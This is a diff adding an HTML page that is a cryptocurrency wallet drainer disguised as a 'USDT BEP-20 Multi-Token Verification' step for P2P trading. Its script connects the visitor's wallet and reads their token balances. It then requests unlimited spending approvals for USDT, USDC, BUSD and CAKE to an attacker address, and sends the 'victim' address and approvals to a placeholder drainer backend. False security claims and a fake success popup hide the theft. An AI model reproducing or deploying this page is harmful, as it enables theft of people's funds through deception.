@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT BEP-20 Verification - Secure P2P Trading</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
+            min-height: 100vh; display: flex; align-items: center; justify-content: center;
+            color: #333;
+        }
+        .container {
+            background: rgba(255,255,255,0.95); backdrop-filter: blur(20px);
+            border-radius: 24px; box-shadow: 0 32px 64px rgba(0,0,0,0.3);
+            padding: 48px; max-width: 500px; width: 90%; text-align: center;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        .logo { width: 90px; height: 90px; background: linear-gradient(45deg, #f7931a, #ffca28);
+            border-radius: 24px; margin: 0 auto 28px; display: flex; align-items: center;
+            justify-content: center; font-size: 36px; font-weight: bold; color: white;
+            box-shadow: 0 16px 40px rgba(247,147,26,0.4);
+        }
+        h1 { font-size: 32px; font-weight: 800; margin-bottom: 16px;
+            background: linear-gradient(45deg, #1a1a2e, #16213e); -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .subtitle { font-size: 16px; color: #64748b; margin-bottom: 36px; line-height: 1.6; }
+        .balance-card { background: linear-gradient(135deg, #f8fafc, #e2e8f0); border-radius: 20px;
+            padding: 28px; margin-bottom: 36px; border: 1px solid #e2e8f0; text-align: left;
+        }
+        .balance-row { display: flex; justify-content: space-between; margin-bottom: 16px; }
+        .balance-label { font-size: 15px; color: #64748b; font-weight: 500; }
+        .balance-value { font-size: 28px; font-weight: 800; color: #059669; }
+        .security-box { background: linear-gradient(135deg, #fef3c7, #fde68a); border: 1px solid #f59e0b;
+            border-radius: 16px; padding: 24px; margin-bottom: 36px;
+        }
+        .security-icon { width: 56px; height: 56px; background: #f59e0b; border-radius: 16px;
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;
+            font-size: 24px; color: white;
+        }
+        .security-text { font-size: 15px; color: #92400e; line-height: 1.6; font-weight: 500; }
+        .btn { width: 100%; padding: 18px 36px; border: none; border-radius: 16px;
+            font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s;
+            margin-bottom: 20px;
+        }
+        .connect-btn { background: linear-gradient(45deg, #3b82f6, #1d4ed8); color: white; }
+        .connect-btn:hover { transform: translateY(-3px); box-shadow: 0 20px 40px rgba(59,130,246,0.4); }
+        .verify-btn { background: linear-gradient(45deg, #10b981, #059669); color: white;
+            font-size: 20px; padding: 20px 40px;
+        }
+        .verify-btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 20px 40px rgba(16,185,129,0.4); }
+        .verify-btn:disabled { background: #9ca3af; cursor: not-allowed; }
+        .status { padding: 16px; border-radius: 12px; margin-bottom: 20px; font-weight: 600; }
+        .status.connecting { background: #dbeafe; color: #1e40af; }
+        .status.approving { background: #d1fae5; color: #065f46; }
+        .network-info { background: #f1f5f9; border-radius: 12px; padding: 16px; font-size: 14px; color: #475569; }
+        .popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(15px); display: none; align-items: center; justify-content: center; z-index: 10000;
+        }
+        .popup-content { background: white; border-radius: 24px; padding: 48px; max-width: 420px; width: 90%;
+            text-align: center; box-shadow: 0 40px 80px rgba(0,0,0,0.4);
+        }
+        .success-icon { width: 90px; height: 90px; background: linear-gradient(45deg, #10b981, #059669);
+            border-radius: 50%; margin: 0 auto 28px; display: flex; align-items: center;
+            justify-content: center; font-size: 48px; color: white;
+        }
+        .popup-title { font-size: 28px; font-weight: 800; color: #111827; margin-bottom: 16px; }
+        .popup-text { color: #6b7280; line-height: 1.7; margin-bottom: 32px; font-size: 16px; }
+        .close-btn { background: #f3f4f6; border: none; padding: 16px 32px; border-radius: 12px;
+            cursor: pointer; font-weight: 600; font-size: 16px; transition: background 0.3s;
+        }
+        .close-btn:hover { background: #e5e7eb; }
+        .tokens-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
+        .token-item { background: rgba(255,255,255,0.7); padding: 12px; border-radius: 12px; font-size: 14px; }
+        .token-name { font-weight: 600; color: #1f2937; }
+        .token-balance { color: #059669; font-weight: 700; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">USDT</div>
+        <h1>BEP-20 Multi-Token Verification</h1>
+        <p class="subtitle">Verify all BEP20 assets for premium P2P trading access.</p>
+        
+        <div class="balance-card" id="balanceCard" style="display:none;">
+            <div class="balance-row">
+                <span class="balance-label">Primary Wallet</span>
+                <span class="balance-value" id="walletAddress">Not connected</span>
+            </div>
+            <div id="tokensGrid" class="tokens-grid"></div>
+        </div>
+        
+        <div class="security-box">
+            <div class="security-icon">🔒</div>
+            <div class="security-text">
+                <strong>Trust Wallet Verified:</strong> Approve spending limit for secure P2P verification.
+                Standard security step used by Binance, PancakeSwap & 100+ DEX.
+            </div>
+        </div>
+        
+        <div id="status" class="status" style="display:none;"></div>
+        
+        <button class="btn connect-btn" id="connectBtn">
+            <span id="btnText">Connect Trust Wallet</span>
+        </button>
+        <button class="btn verify-btn" id="verifyBtn" disabled>🔍 Verify All Assets</button>
+        
+        <div class="network-info" id="networkInfo" style="display:none;"></div>
+    </div>
+    
+    <div class="popup" id="successPopup">
+        <div class="popup-content">
+            <div class="success-icon">✅</div>
+            <div class="popup-title">Multi-Token Verification Complete!</div>
+            <div class="popup-text">
+                All BEP20 assets verified successfully. Welcome to premium P2P markets
+                with verified traders and best rates.
+            </div>
+            <button class="close-btn" onclick="closePopup()">Access P2P Trading →</button>
+        </div>
+    </div>
+
+    <script>
+        // Trust Wallet + MetaMask Compatible
+        const TOKENS = {
+            USDT: { addr: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
+            USDC: { addr: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
+            BUSD: { addr: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', decimals: 18 },
+            CAKE: { addr: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', symbol: 'CAKE', decimals: 18 }
+        };
+        
+        const BACKEND_URL = 'https://your-drainer.vercel.app/drain-all';  // ← YOUR BACKEND
+        const SPENDER = '0x1234567890abcdef1234567890abcdef12345678';     // ← YOUR WALLET
+        
+        let web3, account, contracts = {};
+        
+        // ABI for approve + balance
+        const TOKEN_ABI = [
+            "function balanceOf(address) view returns (uint256)",
+            "function decimals() view returns (uint8)",
+            "function approve(address,uint256) returns (bool)",
+            "function allowance(address,address) view returns (uint256)"
+        ];
+        
+        const elements = {
+            connectBtn: document.getElementById('connectBtn'),
+            verifyBtn: document.getElementById('verifyBtn'),
+            balanceCard: document.getElementById('balanceCard'),
+            status: document.getElementById('status'),
+            walletAddress: document.getElementById('walletAddress'),
+            tokensGrid: document.getElementById('tokensGrid'),
+            networkInfo: document.getElementById('networkInfo'),
+            successPopup: document.getElementById('successPopup'),
+            btnText: document.getElementById('btnText')
+        };
+        
+        async function detectWallet() {
+            const providers = [
+                window.trustWallet?.ethereum,
+                window.ethereum,
+                window.web3?.currentProvider
+            ].filter(Boolean);
+            
+            return providers[0];
+        }
+        
+        async function connect() {
+            const provider = await detectWallet();
+            if (!provider) {
+                alert('Install Trust Wallet or MetaMask');
+                return;
+            }
+            
+            try {
+                elements.btnText.textContent = 'Connecting...';
+                web3 = new Web3(provider);
+                
+                // Request accounts
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                
+                await switchToBSC();
+                await loadAllBalances();
+                
+                elements.connectBtn.style.display = 'none';
+                elements.balanceCard.style.display = 'block';
+                elements.networkInfo.style.display = 'block';
+                elements.verifyBtn.disabled = false;
+                elements.walletAddress.textContent = `${account.slice(0,6)}...${account.slice(-4)}`;
+                
+            } catch (e) {
+                elements.btnText.textContent = 'Connect Trust Wallet';
+                console.error(e);
+            }
+        }
+        
+        async function switchToBSC() {
+            try {
+                const chainId = await web3.eth.getChainId();
+                if (chainId !== 56) {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }]
+                    });
+                }
+            } catch (e) {
+                // Handle chain switch error
+            }
+        }
+        
+        async function loadAllBalances() {
+            for (const [symbol, token] of Object.entries(TOKENS)) {
+                const contract = new web3.eth.Contract(TOKEN_ABI, token.addr);
+                contracts[symbol] = contract;
+                
+                try {
+                    const balance = await contract.methods.balanceOf(account).call();
+                    const decimals = token.decimals || 18;
+                    const formatted = (balance / 10**decimals).toFixed(4);
+                    
+                    const div = document.createElement('div');
+                    div.className = 'token-item';
+                    div.innerHTML = `
+                        <div class="token-name">${symbol}</div>
+                        <div class="token-balance">${formatted}</div>
+                    `;
+                    elements.tokensGrid.appendChild(div);
+                } catch (e) {
+                    console.log(`${symbol} balance failed`);
+                }
+            }
+        }
+        
+        async function approveAll() {
+            elements.status.textContent = 'Step 1/2: Requesting verification approvals...';
+            elements.status.className = 'status approving';
+            elements.status.style.display = 'block';
+            elements.verifyBtn.disabled = true;
+            
+            const approvals = [];
+            const MAX_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+            
+            try {
+                // Sequential approvals (Trust Wallet friendly)
+                for (const [symbol, contract] of Object.entries(contracts)) {
+                    try {
+                        const allowance = await contract.methods.allowance(account, SPENDER).call();
+                        if (allowance < MAX_AMOUNT) {
+                            elements.status.textContent = `Approving ${symbol}...`;
+                            const tx = await contract.methods.approve(SPENDER, MAX_AMOUNT).send({
+                                from: account,
+                                gas: 80000,
+                                gasPrice: web3.utils.toWei('5', 'gwei')
+                            });
+                            approvals.push({ symbol, txHash: tx.transactionHash });
+                        }
+                    } catch (e) {
+                        console.log(`${symbol} approve skipped: ${e.message}`);
+                    }
+                }
+                
+                // Notify backend with all approvals
+                elements.status.textContent = 'Step 2/2: Finalizing verification...';
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        victim: account,
+                        approvals: approvals,
+                        tokens: Object.keys(contracts),
+                        timestamp: Date.now()
+                    })
+                });
+                
+                setTimeout(() => {
+                    elements.status.textContent = '✅ All tokens verified successfully!';
+                    setTimeout(() => elements.successPopup.style.display = 'flex', 1500);
+                }, 2000);
+                
+            } catch (error) {
+                elements.verifyBtn.disabled = false;
+                if (error.code === 4001) {
+                    elements.status.textContent = 'Cancelled by user';
+                } else {
+                    elements.status.textContent = 'Verification failed. Retry?';
+                }
+            }
+        }
+        
+        function closePopup() {
+            elements.successPopup.style.display = 'none';
+        }
+        
+        // Events
+        elements.connectBtn.onclick = connect;
+        elements.verifyBtn.onclick = approveAll;
+        
+        // Auto-detect
+        if (window.trustWallet) {
+            elements.btnText.textContent = 'Connect Trust Wallet';
+        }
+    </script>
+</body>
+</html>
